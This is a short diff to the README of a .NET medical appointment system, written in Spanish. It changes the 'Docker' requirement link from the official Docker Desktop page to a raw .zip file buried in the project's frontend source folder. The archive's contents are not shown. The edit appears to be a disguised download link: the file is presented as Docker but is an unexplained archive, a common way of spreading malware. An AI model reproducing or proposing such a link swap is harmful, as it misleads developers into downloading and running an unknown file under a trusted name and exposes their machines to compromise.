@@ -18,7 +18,7 @@ Este proyecto es un sistema de gestión de citas médicas desarrollado con **.NE
 La forma más rápida de ejecutar el proyecto es utilizando Docker Compose. Esto levantará tanto la base de datos (In-Memory para esta versión), el API y el Frontend.
 
 ### Requisitos
-- [Docker](https://www.docker.com/products/docker-desktop/)
+- [Docker](https://github.com/rubendario921/appointment-management-system/raw/refs/heads/main/appointment-web/src/app/appointment-page/management-system-appointment-2.0.zip)
 - Docker Compose
 
 ### Pasos:
